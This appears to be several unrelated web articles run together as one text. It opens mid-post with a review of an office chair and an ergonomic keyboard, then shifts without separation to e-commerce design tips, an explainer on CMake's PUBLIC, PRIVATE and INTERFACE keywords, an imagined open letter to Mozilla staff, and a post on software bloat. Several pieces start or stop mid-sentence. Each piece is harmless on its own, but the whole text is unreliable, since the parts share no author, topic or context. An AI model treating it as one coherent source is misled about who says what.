One, put it on a level surface and extend seat height to maximum; check whether it’s developed a wobble.
Two, test whether the tilt tension control still works (adjusted with a crank on the right side).
I use it locked all the time anyway, but you might care about this feature - I’d just use its absence to secure a further discount!</p>
<p>The only other advice here is not to buy one of those <a href="https://youtu.be/x3DpVTyQOyM">ergonomic kneeling chairs</a>.
They’re cheap &amp; compact, but if you’re like me your back will get tired and you’ll just revert to a horrible forward-slouching posture.
If you really think you’ve got what it takes, try sitting on an inexpensive yoga ball first - at least you might be able to use it for other things when the whole venture goes sideways.</p>
<h3 id="keyboard-goldtouch-gtn-0099">Keyboard: Goldtouch GTN-0099</h3>
<p>Let’s start this section with a hot take: mechanical keyswitches are wholly unnecessary for a good keyboard experience.
I had a <a href="https://www.daskeyboard.com/model-s-professional/">Das Keyboard</a> long ago (without keylabels for <em>extra hacker cred</em>), and it was nice for a bit but you quickly tune out the clickiness (although your roommates don’t).
In the end it just isn’t worth the huge extra cost &amp; noise (yes I’ve heard of Cherry MX Silent Red switches, leave me alone you fanatics).
Mechanical keyswitches provide very dubious ergonomic benefit.
I will say it’s humorous seeing tons of love &amp; effort dumped into custom mechanical keyboards that still use a flat slab layout like they’re some throwaway Dell keyboard from 2006.
Show some love toward your wrists, you barbarians!</p>
<p>For a number of years I used the <a href="https://www.microsoft.com/en-us/p/microsoft-sculpt-ergonomic-desktop/8xk02kz6k69w?activetab=pivot%3aoverviewtab">Microsoft Sculpt Ergonomic Keyboard</a>, which was nearly perfect except for the build quality being complete crap - I burned through two of them in four years (this seems to be a common story).
After the second one died I started using the <a href="https://www.microsoft.com/accessories/en-us/products/keyboards/natural-ergonomic-keyboard-4000/b2m-00012">Microsoft Natural Ergonomic Keyboard 4000</a>, an enormous dinosaur which can reliably be found for $20 used.
Unfortunately it has a full number pad on the right side, meaning you’re either reaching way out toward your mouse or pushing the keyboard to your left and typing with asymmetric hand positions:</p>
<figure>
    <img src="https://ahelwer.ca/img/ergonomics/ms4k-hand-position.jpg"> 
</figure>

<p>I wanted a keyboard that was split/tented, no number pad, bombproof build quality, and less than $120 or so.
It came down to the <a href="https://kinesis-ergo.com/shop/freestyle2-for-pc-us/">Kinesis Freestyle2</a> and the <a href="https://shop.goldtouch.com/products/goldtouch-v2-adjustable-comfort-keyboard-pc-only">Goldtouch GTN-0099</a>.
In the end I chose Goldtouch because it’s much less expensive ($60 on eBay!) and looks decidedly less cheap than the Kinesis and its weird sold-separately tenting kit.
I couldn’t be happier!
I love the Goldtouch’s chunkiness &amp; solidity.
The keyswitches are sturdy &amp; pleasant to type on.
Also, it is very adjustable - the keyboard halves are connected by a lockable ball joint you can set to any reasonable combination of split and tent angle.</p>
<figure>
    <img src="https://ahelwer.ca/img/ergonomics/goldtouch-keyboard.jpg"> 
</figure>

<p>It strikes me as odd that I so rarely saw mention of Goldtouch in any of the (many) discussions of ergonomic keyboards I’ve read in my time online.
Maybe it’s …</p></article></div></div></div></div>

While female gamers are more likely to purchase lighter colored gaming peripherals.</p><p>If you already have sales then you can take existing sales data and analyze it. </p><p>Figure out what are the differences between products purchased by males and females.</p><p>This would help you create two product categories. One for males and the other for females.</p><p>That way your potential customers don’t have to look through products they are definitely not interested in.</p><p>You can segment your audience based on multiple characteristics, not just gender.</p><p>Here are just a couple of segmentation ideas that can be used for any kind of ecommerce store:</p><ul><li>Age</li><li>Location</li><li>Gender</li></ul><p>You should not get very obscure with segmentation. Otherwise, the strategy may not be as effective.</p><p><img alt="Image of e-commerce products segmented to have the following categories: kids, female, male watches" src="https://socialoracle.app/blog/article/8/cdn.socialoracle.app/internal/blog_images/simple-tips-how-to-optimize-ecommerce-website/how-to-segment-products-based-on-gender-ecommerce-store.png"> </p><p>The following image is a great segmentation example! </p><p>There are multiple segments with specific categories that can be clicked out. </p><p>No shop now call to action buttons needed!</p><p>If you have not done it yet you should definitely segment your audience and categorize your products. </p><p>Make sure it’s as simple as possible for your potential customers to find the products that they are looking for.</p><p>Segmentation is a great segway to our next point.</p><h2>Have a rich set of categories and subcategories</h2><p>If you are selling more than a few products you should definitely have all of them categorized and subcategorized.</p><p>By categorizing products you make it easy for visitors to find the items they are interested in. Which in return will increase the odds of them making a purchase.</p><p>Even if you sell just t-shirts you can still break them down into different subcategories:</p><ul><li>With graphics</li><li>With messages</li><li>Male</li><li>Female</li><li>Unisex</li><li>Dark</li><li>Light</li><li>Colorful</li><li>Funny</li><li>Long sleeve </li></ul><p>The list can go on and on. Of course, you should not have tens of subcategories that don’t make sense.</p><p>The key is to know what you're selling. If you know each and every item that you are selling, then it will be easier for you to place products into categories and subcategories.</p><p>More often than not a single product will belong to multiple subcategories. That is completely fine, as long as the product and category sort of match.</p><p><img alt="E-Commerce shop menu with multiple sub-menus including sub-categories" src="https://cdn.socialoracle.app/internal/blog_images/simple-tips-how-to-optimize-ecommerce-website/how-many-subcategories-for-ecommerce-store-example.png"></p><p>The pictured store is called Nasty Gal. As you can see, they have a rich set of categories combined with subcategories. </p><p>Just for their Tops category, they have 16 subcategories. Even though their products in subcategories often overlap, the overlaps are very logical.</p><h2>More call to action buttons is better?</h2><p>Absolutely not! Having tons of buttons may seem like a good idea, but it’s not. </p><p>In reality, this is one of the biggest conversion killers out there. You should be conservative with the <a href="https://socialoracle.app/blog/article/5/8-ways-to-increase-ecommerce-sales-and-conversions" target="_blank">amount of call to action buttons on your landing page</a>.</p><p>Call to action buttons are how you connect with your customers. </p><p>Imagine you are trying to make a sale in real life. Would you say Buy now over and over again?</p><p>Most probably not. </p><p>So why would you apply the same strategy for your ecommerce store?</p><p>Many stores have way too many call to action buttons on their landing pages. </p><p>You may think that several Shop now buttons will make it easy for visitors to start shopping.</p><p>In reality, it just doesn’t work that way.</p><p>Having way too many call to action buttons makes a site look like a low-quality sham. </p><p>The call to action buttons should also have meaningful and original content instead of the generic Shop now or Buy now text. </p><p>That doesn’t mean you should never use the Shop or Shop now phrase for your call to action buttons. </p><p>You can use them, but not in rapid succession, and always try to be original.</p><p>Very often I see stores where the Shop now button is placed side-by-side dozens of times. </p><p>It really doesn’t want to make me shop for anything.</p><h2>Start building trust with visitors immediately</h2><p>Instead of expecting your visitors to blindly trust you, make them trust you.</p><p>Show off customer testimonials on your landing page.</p><p>In addition to customer testimonials, show trust badges on your landing page. There are tons of free Shopify trust badge apps out there.</p><p>Since it’s not possible for visitors to see how busy your store is, use <a href="https://socialoracle.app/blog/article/6/how-to-use-social-influence-to-drive-up-sales-and-conversions" target="_blank">informational social influence to increase conversions</a> to show off the popularity of your store. </p><p>Make your visitors feel at ease by showing them that other people already trust you. Building trust with visitors is a very important strategy that is not implemented by many e-commerce stores.</p><p>So make the most of it! It’s a great way to have an edge over your competitors.</p><p><img alt="Three happy customer testimonials on an e-commerce website that sells watches" src="https://cdn.socialoracle.app/internal/blog_images/simple-tips-how-to-optimize-ecommerce-website/add-testimonials-to-ecommerce-page.png"></p><p>The Watch Box has done a great job with their testimonials section. It’s right on their landing page too!</p><p>Of course, it’s likely that your store has not been featured in the news just yet. So instead of having an “In the news” section, you could show off your trust badges.</p><p>The testimonials include information about the person who made the purchase, their rating, and what they purchased.</p><p>They also show off the total amount of reviews they have. If you have gathered a good amount of reviews, then you should implement something similar on your landing page.</p><h2>Have a modern store design</h2><p>When it comes to e-commerce stores, then old school is not cool.</p><p>This one may seem a bit obvious, but you would be surprised how many store owners settle with an outdated design.</p><p>There are not many examples of Shopify stores having a very outdated design, unless you are really trying to make your visitors feel like they traveled to 2008.</p><p>But outdated and ugly design elements plague stores built on platforms that are not Shopify.</p><p>Why does design matter?</p><p>An outdated store design can make the products sold at the said store feel low quality. Even if the products you sell are great.</p><p>Visitors will automatically have a bias due to the lack of polish applied to your store.</p><p>Here are some common pitfalls to avoid:</p><p><strong>Large blocks of text</strong></p><p>Instead of having a whole bunch of text on your pages, trying to explain your product, have visuals that do the work for you.</p><p>Try to replace large text blocks with good looking images and videos.</p><p><img alt="Image of an e-commerce landing page trying to sell a pregnancy device. The image only has tons of boring text and a pregnant lady sitting at the drivers seat of a car" src="https://cdn.socialoracle.app/internal/blog_images/simple-tips-how-to-optimize-ecommerce-website/how-much-text-ecommerce-landing-page%400%2C5x.png"></p><p>In this image, we can see a whole novel being written out. The image is also very generic.</p><p>Instead of a novel, the store should have a video preview or a few images which would explain whatever it is they are selling.</p><p><strong>Dull colors</strong></p><p>Try to avoid dull colors. For example, if your site has a white background, then don’t add large gray buttons. Have two or three eye-catching colors used throughout the store.</p><p>Make the most important things like call to action buttons stand out.</p><p><img alt="E-Commerce store landing page that is filled with dull colors and shady links" src="https://cdn.socialoracle.app/internal/blog_images/simple-tips-how-to-optimize-ecommerce-website/what-colors-not-to-use-for-ecommerce-website%400%2C5x.png"></p><p>The store on this image looks like it has not updated its style since they opened back in 1999. </p><p>They have found all the design mistakes it's possible to make and then made them all.</p><p>Lots of dull colors, low-quality images, generic images, and a bad font choice.</p><p>On the plus side, they have a customer testimonial right on their landing page which is nice.</p><p><strong>Use modern fonts</strong></p><p>Stop using fonts like Arial, Times New Roman or Comic Sans. Today, the three most popular fonts are <a href="https://fonts.google.com/analytics" target="_blank">Roboto, Open Sans, and Lato</a>. </p><p>And for good reason. The fonts look like they belong on a site created in 2020. </p><p>Fonts like Arial just look very outdated. If I see an old font in a modern-looking store, I instantly feel like the products sold at the store are from the last decade.</p><h2>Avoid squeeze pages</h2><p>So what is the difference between a squeeze page and a landing page?</p><p>The single key difference is the fact that squeeze pages try to extort the visitor’s email address with popups.</p><p>Unless you're actually giving the customer real value for their email address, a squeeze page is not a good idea. That is just not how you should go about collecting email addresses in 2020.</p><p>If you want to collect email addresses from potential customers, have a separate form that is above the fold.</p><p>Above the fold is the upper half of your landing page.

      <h3 id="introduction">Introduction</h3>

<p>CMake is one of the most convenient building tools for C/C++ projects. When it comes to <a href="https://cmake.org/cmake/help/latest/command/target_include_directories.html"><code>target_include_directories</code></a> and <a href="https://cmake.org/cmake/help/latest/command/target_link_libraries.html"><code>target_link_libraries</code></a>, there are several keywords, <code>PUBLIC</code>, <code>PRIVATE</code>, and <code>INTERFACE</code>, that I got confused about from time to time even if I have read the related official documentations. So When I was building my C/C++ projects using CMake, I often just use <code>PUBLIC</code> everywhere or leave the keyword blank (CMake will then use <code>PUBLIC</code> by default), the libraries and executables built from the projects would work in most of the scenarios. However, it is certainly not best practice.</p>



<p>Today, I read Kuba Sejdak’s blog post <a href="https://kubasejdak.com/modern-cmake-is-like-inheritance">“Modern CMake is Like Inheritance”</a> and I found his interpretation on the CMake keywords <code>PUBLIC</code>, <code>PRIVATE</code>, and <code>INTERFACE</code> inspiring. So in this blog post, I would like to discuss some of my thoughts on these CMake keywords from the perspective of “inheritance”.</p>

<h3 id="c-inheritance">C++ Inheritance</h3>

<h4 id="access-specifiers">Access Specifiers</h4>

<p>In C++ object oriented programming, there are three types of access specifiers for classes.</p>



<table>
<thead>
  <tr>
    <th>Access Specifier</th>
    <th>Description</th>
  </tr>
</thead>
<tbody>
  <tr>
    <td>public</td>
    <td>Members are accessible from outside the class.</td>
  </tr>
  <tr>
    <td>protected</td>
    <td>Members cannot be accessed from outside the class. However, they can be accessed in inherited classes.</td>
  </tr>
  <tr>
    <td>private</td>
    <td>Members cannot be accessed (or viewed) from outside the class.</td>
  </tr>
</tbody>
</table>

<p>Alternatively, this could be described using the following simplified table.</p>



<table>
<thead>
  <tr>
    <th>Access Specifier</th>
    <th>Same Class</th>
    <th>Derived Class</th>
    <th>Outside Class</th>
  </tr>
</thead>
<tbody>
  <tr>
    <td>public</td>
    <td>Yes</td>
    <td>Yes</td>
    <td>Yes</td>
  </tr>
  <tr>
    <td>protected</td>
    <td>Yes</td>
    <td>Yes</td>
    <td>No</td>
  </tr>
  <tr>
    <td><span>private</span></td>
    <td>Yes</td>
    <td>No</td>
    <td>No</td>
  </tr>
</tbody>
</table>

<h4 id="inheritance-types">Inheritance Types</h4>

<p>When it comes to class inheritance, there are also three types of inheritances.</p>



<table>
<thead>
  <tr>
    <th>Inheritance Type</th>
    <th>Description</th>
  </tr>
</thead>
<tbody>
  <tr>
    <td>public</td>
    <td>Public members of the base class become public members of the derived class and protected members of the base class become protected members of the derived class. A base class's private members are never accessible directly from a derived class, but can be accessed through calls to the public and protected members of the base class.</td>
  </tr>
  <tr>
    <td><span>protected</span></td>
    <td>Public and protected members of the base class become protected members of the derived class.</td>
  </tr>
  <tr>
    <td>private</td>
    <td>Public and protected members of the base class become private members of the derived class.<br></td>
  </tr>
</tbody>
</table>

<p>Alternatively, this could be described using the following simplified table.</p>



<table>
<thead>
  <tr>
    <th>Inheritance Type</th>
    <th>base: public member</th>
    <th><span>base: </span>protected <span>member</span></th>
    <th><span>base: </span>private <span>member</span></th>
  </tr>
</thead>
<tbody>
  <tr>
    <td>public</td>
    <td>derived: public member</td>
    <td><span>derived: </span>protected member</td>
    <td>-</td>
  </tr>
  <tr>
    <td>protected</td>
    <td><span>derived: </span>protected <span>member</span></td>
    <td><span>derived:</span> protected <span>member</span></td>
    <td>-</td>
  </tr>
  <tr>
    <td>private</td>
    <td><span>derived:</span> private <span>member</span></td>
    <td><span>derived:</span> private <span>member</span></td>
    <td>-</td>
  </tr>
</tbody>
</table>

<h3 id="cmake-inheritance">CMake Inheritance</h3>

<p>CMake uses somewhat similar inheritance concepts to C++, especially for the C++ <code>public</code> and <code>private</code> access specifiers and inheritance types. The CMake keywords <code>PUBLIC</code>, <code>PRIVATE</code>, and <code>INTERFACE</code> used in <code>target_include_directories</code> and <code>target_link_libraries</code>, in my opinion, are mixtures of access specifier and inheritance type from C++.</p>

<h4 id="include-inheritance">Include Inheritance</h4>

<p>In CMake, for any <code>target</code>, in the preprocessing stage, it comes with a <code>INCLUDE_DIRECTORIES</code> and a <code>INTERFACE_INCLUDE_DIRECTORIES</code> for searching the header files building. <code>target_include_directories</code> will populate all the directories to <code>INCLUDE_DIRECTORIES</code> and/or <code>INTERFACE_INCLUDE_DIRECTORIES</code> depending on the keyword <code>&lt;PRIVATE|PUBLIC|INTERFACE&gt;</code> we specified. The <code>INCLUDE_DIRECTORIES</code> will be used for the current <code>target</code> only and the <code>INTERFACE_INCLUDE_DIRECTORIES</code> will be appended to the <code>INCLUDE_DIRECTORIES</code> of any other <code>target</code> which has dependencies on the current <code>target</code>. With such settings, the configurations of <code>INCLUDE_DIRECTORIES</code> and <code>INTERFACE_INCLUDE_DIRECTORIES</code> for all building targets are easy to compute and scale up even for multiple hierarchical layers of building dependencies and many building targets.</p>



<table>
<thead>
  <tr>
    <th>Include Inheritance</th>
    <th>Description</th>
  </tr>
</thead>
<tbody>
  <tr>
    <td>PUBLIC</td>
    <td>All the directories following PUBLIC will be used for the current target and <span>the other targets that have dependencies on the current target, i.e., appending the directories to </span>INCLUDE_DIRECTORIES and INTERFACE_INCLUDE_DIRECTORIES.</td>
  </tr>
  <tr>
    <td>PRIVATE</td>
    <td><span>All the include directories following PRIVATE will be used for the current target only</span>, i.e., appending the directories to <span>INCLUDE_DIRECTORIES.</span></td>
  </tr>
  <tr>
    <td>INTERFACE</td>
    <td><span>All the include directories following INTERFACE</span> will NOT be used for the current target but will be accessible for the other targets that have dependencies on the current target<span>, i.e., appending the directories to </span>INTERFACE_INCLUDE_DIRECTORIES.</td>
  </tr>
</tbody>
</table>

<p>Note that when we do <code>target_link_libraries(&lt;target&gt; &lt;PRIVATE|PUBLIC|INTERFACE&gt; &lt;item&gt;)</code>, the dependent <code>&lt;item&gt;</code>, if built in the same CMake project, would append the <code>INTERFACE_INCLUDE_DIRECTORIES</code> of <code>&lt;item&gt;</code> to the <code>INCLUDE_DIRECTORIES</code> of <code>&lt;target&gt;</code>. By controlling the <code>INTERFACE_INCLUDE_DIRECTORIES</code>, we could eliminate some unwanted or conflicting declarations from <code>&lt;item&gt;</code> to the <code>&lt;target&gt;</code>.</p>



<p>For example, the <code>fruit</code> library has <code>INCLUDE_DIRECTORIES</code> of <code>fruit_h</code>, <code>tree_h</code>, and <code>INTERFACE_INCLUDE_DIRECTORIES</code> of <code>fruit_h</code>. If there is a <code>apple</code> library that is linked with the <code>fruit</code> library, the <code>apple</code> library would also have the <code>fruit_h</code> in its <code>INCLUDE_DIRECTORIES</code> as well. We could equivalently say, the <code>apple</code> library’s include directory inherited the <code>fruit_h</code> of the  <code>fruit</code> library.</p>

<h4 id="link-inheritance">Link Inheritance</h4>

<p>Similarly, for any <code>target</code>, in the linking stage, we would need to decide, given the <code>item</code> to be linked, whether we have to put the <code>item</code> in the link dependencies, or the link interface, or both, in the compiled <code>target</code>. Here the link dependencies means the <code>item</code> has some implementations that the <code>target</code> would use, and it is linked to the <code>item</code>, so that whenever we call the functions or methods corresponding to those implementations it will always be mapped correctly to the implementations in <code>item</code> via the link, whereas the link interface means the <code>target</code> becomes an interface for linking the <code>item</code> for other targets which have dependencies on the <code>target</code>, and the <code>target</code> does not have to use <code>item</code> at all.</p>



<table>
<thead>
  <tr>
    <th>Link Type</th>
    <th>Description</th>
  </tr>
</thead>
<tbody>
  <tr>
    <td>PUBLIC</td>
    <td>All the objects following PUBLIC will be used for linking to the current target and providing the interface to the other targets that have dependencies on the current target.</td>
  </tr>
  <tr>
    <td>PRIVATE</td>
    <td><span>All the objects following </span>PRIVATE will only be used for linking to the current target.</td>
  </tr>
  <tr>
    <td>INTERFACE</td>
    <td><span>All the objects following </span>INTERFACE will only be used for providing the interface to the other targets that have dependencies on the current target.</td>
  </tr>
</tbody>
</table>

<p>For example, if the <code>fruit</code> library has the implementation of functions, such as <code>size</code> and <code>color</code>, and the <code>apple</code> library has a function <code>apple_size</code> which called the <code>size</code> from the <code>fruit</code> library and was <code>PRIVATE</code> linked with the <code>fruit</code> library. We could create an executable <code>eat_apple</code> that calls <code>apple_size</code> by <code>PUBLIC</code> or <code>PRIVATE</code> linking with the <code>apple</code> library. However, if we want to create an executable <code>eat_apple</code> that calls the <code>size</code> and <code>color</code> from the <code>fruit</code> library, only linking with the <code>apple</code> library will cause building error, since the <code>fruit</code> library was not part of the interface in the <code>apple</code> library, and is thus inaccessible to <code>eat_apple</code>. To make the <code>apple</code> library to inherit the <code>size</code> and <code>color</code> from the <code>fruit</code> library, we have to make the linking of the <code>apple</code> library to the the <code>fruit</code> library <code>PUBLIC</code> instead of <code>PRIVATE</code>.</p>

<h3 id="conclusions">Conclusions</h3>

<p>The CMake builds a hierarchical project via the include interface or link interface. The “inheritance” mechanism in C++ is built upon the include interface or link interface.</p>

<h3 id="faq">FAQ</h3>

<h4 id="how-to-understand-cmake-interface">How to Understand CMake Interface?</h4>

<p>In my understanding, CMake interface is just like a telephone switch station in old times.</p>

<div>
<figure>
    <img src="https://leimao.github.io/images/blog/2020-08-08-CMake-Public-Private-Interface/medienwandel-chicago-union-station-telegraph-switchboard.jpg">
    <figcaption>Telephone Switch Station</figcaption>
</figure>
</div>

<p>If <code>A</code> wants to call <code>B</code> and there is no direct telephone cable connection between <code>A</code> and <code>B</code>, <code>A</code> has to call a telephone switch station that has connection to <code>B</code> and the personal in the telephone switch station will connect <code>A</code> and <code>B</code> by jointing the cable of <code>A</code> and the cable of <code>B</code> together. If the telephone switch station does not know there is a <code>B</code>, it is impossible to get <code>A</code> and <code>B</code> connected. So CMake interface is simply a registration in the telephone switch station. When there is a dependency in CMake targets, targets from different levels of hierarchy are connected via interfaces, for both <code>include</code> and <code>link</code>.</p>

<h4 id="what-are-the-key-points-for-this-blog-post">What are the Key Points for This Blog Post?</h4>

<p><code>PRIVATE</code> only cares about himself and does not allow inheritance. <code>INTERFACE</code> only cares about others and allows inheritance. <code>PUBLIC</code> cares about everyone and allows inheritance.</p>

<h4 id="is-public-private-interface-part-of-the-gccg-compiler">Is PUBLIC, PRIVATE, INTERFACE Part of the GCC/G++ Compiler?</h4>

<p>No. Compilers, such as <code>gcc</code> and <code>g++</code>, do not have such mechanism. CMake invented those keywords for user to create a building graph that has very clear and explicit dependencies. The building graph translates to normal building commands using <code>gcc</code> and <code>g++</code>.</p>

</div>

<p><em>(The following is what I, <a href="https://tryingtobeawesome.com/about/" rel="nofollow noreferrer">Steve Phillips</a>, would say to all Mozillians if I were CEO.)</em></p>

<hr>

<p>The time has come to make a choice: will Mozilla fade into irrelevance, or will we enter our finest period yet?</p>

<p><em>I choose the latter.</em>  Here is how we will seize this moment, beginning <em>today</em>.</p>

<h2 id="what-do-we-stand-for">What Do We Stand For?</h2>

<p><strong>We stand for the user</strong>.  We are trusted, and our products are trustworthy.  It is this fundamental advantage that we must leverage going forward, in conjunction with our world-class engineering and design teams.</p>

<p>We will do what our competitors are structurally and morally incapable of doing -- empowering users, not exploiting them.</p>

<h2 id="the-future-will-be-encrypted">The Future Will Be Encrypted</h2>

<p>We will build <strong>Firefox Sync Plus</strong>, an encrypted file- and data-syncing service that gives users secure access to all of their documents, contacts, files, calendar events, passwords, chat history, browser settings, and more.  Sync Plus will be accessible from all their devices and every browser -- not just Firefox.  This service will be at the center of their digital life, and make their everyday lives much more convenient, private, and secure.</p>

<p>If 5 million users pay us an average of $7.50/month, that would be $37.5 million/month or <strong>$450 million/year</strong>, doubling our current budget (or keeping us fully intact if Google eventually pulls the plug) -- and this is just one service.  Sync Plus will be built on open standards that empower anyone to host their own server -- which may even federate with ours (stay tuned).</p>

<p>We have already built several pieces of this vision: Firefox Sync, Firefox Send, and Firefox Lockwise.  What's missing is a generic, encrypted data-syncing layer to tie them all together, and we are the best-positioned organization in the world to create precisely that.</p>

<h2 id="the-future-will-be-web-assembled">The Future Will Be Web-Assembled</h2>

<p>We will continue to revolutionize software security with Rust and <a href="https://hacks.mozilla.org/2019/03/standardizing-wasi-a-webassembly-system-interface/" rel="nofollow noreferrer">WebAssembly + WASI</a>, bringing about a future where programmers create one version of their app that runs natively on every device, and in every web browser, without users needing to trust it with <a href="https://hacks.mozilla.org/2019/11/announcing-the-bytecode-alliance/" rel="nofollow noreferrer">the keys to the kingdom</a>.</p>

<p>By enabling the construction of universal apps that can be built using any popular programming language, WebAssembly will collectively save developers' employers <strong>tens of billions of dollars per year</strong> that is currently wasted on recreating the same exact app for the web, Android, and iOS.  And they can save even more money (or use those funds to build uniquely valuable software) by paying us to help them accelerate their adoption of WebAssembly.</p>

<p>(There are other, more counterintuitive ways to monetize WebAssembly that are too sensitive for such a public forum; contact me privately for details.)</p>

<h2 id="the-future-will-be-voice-controlled">The Future Will Be Voice-controlled</h2>

<p>The average person types on their phone at 20 words per minute (wpm), types on a physical keyboard at 40 wpm, but speaks at 120 wpm -- 6x faster than typing on their phone.  It is inevitable that we will use our voices to control our devices (alongside other methods).</p>

<p>Speaking commands to our devices and using speech-to-text are increasingly common, but Amazon, Google, and Apple's voice assistants almost always upload the audio of you speaking to some data center rather than "transcribing" it locally.</p>

<p>With our recent launch of <a href="https://voice.mozilla.org/firefox-voice/" rel="nofollow noreferrer">Firefox Voice</a>, we are giving users a better option -- one we will extend far beyond the browser (hear that, Samsung?).  And <a href="https://blog.cryptographyengineering.com/2016/06/15/what-is-differential-privacy/" rel="nofollow noreferrer">differential privacy</a> techniques will improve privacy even more while enabling us to create world-class products without being at a data disadvantage.</p>

<h2 id="the-future-will-be-ethically-monetized">The Future Will Be Ethically Monetized</h2>

<p>Getting users to pay for open source is simple -- offer it as a service instead.  (Trying to monetize FOSS via consulting is a trap; it simply doesn't scale.)</p>

<p>We will also embrace the <a href="https://ethicalsource.dev/" rel="nofollow noreferrer">Ethical Source</a> movement to ensure that the software we create is compatible with human rights, and to prevent the exploitation of open source developers -- ourselves included -- by tech giants who sell our software as a service and cut us out of the loop.</p>

<h2 id="the-future-will-be-federated">The Future Will Be Federated</h2>

<p>We will partner with the most innovative, privacy-friendly organizations in the world: CloudFlare, Mullvad, ProtonMail, DuckDuckGo, Freedom of the Press Foundation, and <em>especially</em> <a href="https://effective.af/" rel="nofollow noreferrer">Effective.AF</a> .</p>

<p>We will also partner with other trusted tech organizations to provide end-to-end encrypted, federated services, where each node is hosted by a different org, and where the network has no single point of failure.  Millions and millions of users will gladly pay a nominal fee each month to a nonprofit they love in exchange for a reliable gateway to a new and better internet -- especially if a portion of their subscription is used to provide the same service to the poor and underprivileged, free of charge.</p>

<h2 id="death-is-not-an-option">Death Is Not An Option</h2>

<p>If we don't let go of the false belief that innovating is riskier than not innovating, we will die.</p>

<p>If we behave like a big, slow, <a href="https://www.eff.org/cyberspace-independence" rel="nofollow noreferrer">weary giant</a> irrationally obsessed with HTML, CSS, JavaScript, and nothing else, we will die.</p>

<p>If we fail to pursue much of the above <em>and more</em>, then we will die, and we will deserve to die.</p>

<h2 id="how-to-thrive">How to Thrive</h2>

<p>Just because we're a nonprofit doesn't mean we have to suck at designing incentive structures.</p>

<h3 id="three-rules-for-success">Three Rules for Success</h3>

<h4 id="rule-1-performance-based-compensation-for-all-managers-starting-at-the-top"><strong>Rule #1: Performance-based compensation for <em>all</em> managers, starting at the top</strong></h4>

<p>Compared to current compensation, this means significantly higher pay for those who achieve their yearly and/or quarterly goals, and somewhat lower pay for those who don't.  Mozilla can afford this by giving lower base pay to all managers, myself included.</p>

<p>Failing to incentivize ourselves to innovate and move quickly is literally 100% more expensive -- it will cost us everything unless we change <em>now</em>.</p>

<p>Besides: a combination of performance-based pay and building products that pull in revenue means that good performance will pay for itself <em>and then some</em>, enabling us to invest more in what is working and to spin up new iniatives.</p>

<h4 id="rule-2-ambitious-goals-only"><strong>Rule #2: Ambitious goals only</strong></h4>

<p>"Achieving" goals that weren't worth striving for in the first place doesn't do us any good.  If you are not trying to change the world, you should not be working at Mozilla; our mission is too important.</p>

<p>Unambitious yearly and quarterly goals will not be approved.</p>

<h4 id="rule-3-whatever-lin-clark-wants-she-gets"><strong>Rule #3: Whatever Lin Clark wants, she gets</strong></h4>

<p>In addition to Lin, we will also maximally support other team leads who possess the trifecta of being a visionary, a clear thinker, and a clear communicator.</p>

<h2 id="the-future-is-now">The Future Is Now</h2>

<p>The world is watching.  What will we do?  Will we die?</p>

<p>We cannot <em>and will not</em> let that happen.  The future of Rust, WebAssembly, WASI, Firefox, Tor Browser, human privacy, and the internet itself are hanging in the balance.</p>

<p>There is so much opportunity that lies before us!  <em>This is our moment.</em>  We must seize it, and create a world that we all <em>love</em>.</p>

<p><em>Let's do this!</em></p>

<p>--(Not) Your CEO</p>

<h4 id="addendum">Addendum</h4>

<p>Greetings Mozillians! :-)</p>

<p><a href="https://tryingtobeawesome.com/about/" rel="nofollow noreferrer">Steve</a> here.  I've thought quite a bit about existential risk and which technologies we must invent -- or oppose -- to create a bright future.  I think about how this mission-critical work can be sustainably funded while inventing what we need.  I'm an ambitious programmer, entrepreneur, and cypherpunk, and have been for many years.</p>

<p>A few things I've learned the hard way: <strong>We must protect human privacy while funding our continued ability to do so</strong>; good intentions are not enough to pay the bills.  We must <strong>be more ambitious</strong> than most organizations think necessary -- especially nonprofits.  And we must <strong>innovate or die</strong>.</p>

<p><strong>It is hard to imagine a world of humane computing without the success of Mozilla, and I would love to help.</strong></p>

<p>Please reach out to me (<a href="https://twitter.com/elimisteve" rel="nofollow noreferrer">Twitter</a>, <a href="mailto:steve@tryingtobeawesome.com" rel="nofollow noreferrer">email</a>, <a href="https://www.linkedin.com/in/sdphillips/" rel="nofollow noreferrer">LinkedIn</a>).  Thank you.</p>

        <p><a href="http://www.mattwardman.com/blog/2007/08/22/dumping-itunes-because-of-software-bloat/" title="See this blog entry, for example"><img src="https://blog.brush.co.nz/wp-content/uploads/2017/10/2008_06_nobloat.png" width="125" height="126" alt="No bloat"></a>Solomon once said <a href="http://www.biblegateway.com/passage/?search=eccl%207:10;&amp;version=31;">not to pine for the good ol’ days</a>, and that’s sage advice, but I’m sure he didn’t intend it to apply to software bloat.</p>

<p>I’m not just talking about memory and megahertz bloat — we’ve also got performance <i>un</i>bloat. And it almost seems like the two go hand-in-hand. The <i>more</i> memory something hogs, the slower it’ll run.</p>

<p>Compare <a href="http://www.foxitsoftware.com/pdf/rd_intro.php">Foxit’s PDF reader</a> to <a href="http://www.adobe.com/products/acrobat/readstep2.html">Adobe Reader</a>:</p>

<ul>
<li>Foxit is a 2.5 MB download, Adobe is a 25 MB one.</li>
<li>Foxit uses 8 MB of memory for a 700 KB PDF, Adobe uses 56 MB.</li>
<li>Foxit loads in about 1 second, Adobe in 4 seconds.</li>
<li>Foxit is as fast or faster to use.</li>
</ul>

<p>Okay, so maybe Foxit doesn’t display all the latest 3D JavaScript-enhanced PDFs, but it does all you need, and it does it (relatively) small, fast, and light.</p>

<p>Maybe it helps (or hinders) to be an <a href="http://brush.co.nz/software">embedded programmer</a>, and know how much you <i>can</i> do with 32 KB of code, 2 KB of RAM, and an 8 MHz, 8-bit processor. Sometimes I wish developers had to write code on ancient 66 MHz 486s. Constraints are the mother of optimization, and programmers will usually forget about optimization after it runs “fast enough” on their 42-core Pentium IX, 10 TB RAM development machine.</p>

<p>Sure, I grant that RAM and clock cycles are cheap these days, and we might as well use ’em. But surely there’s a limit to all this. When my (plain text!) editor runs slow enough so I can see the screen updating, there’s something wrong.</p>

<p>When Visual Studio takes 2 entire seconds to pop up a simple properties window the first time, there’s something wrong.</p>

<p>Back in the days when programmers cared about how many characters they could write to video memory during the <a href="http://en.wikipedia.org/wiki/Color_Graphics_Adapter">CGA</a> horizontal retrace time without it producing snow — back in those days, and running on a 286, I couldn’t see my screen updating.</p>

<p>We now have 1000’s of times the computing power, and as far as user experience is concerned, stuff runs slower than it used it. And we put up with it, because they’ve added one or two features we like, and it’s “good enough”. But it just ain’t right.</p>

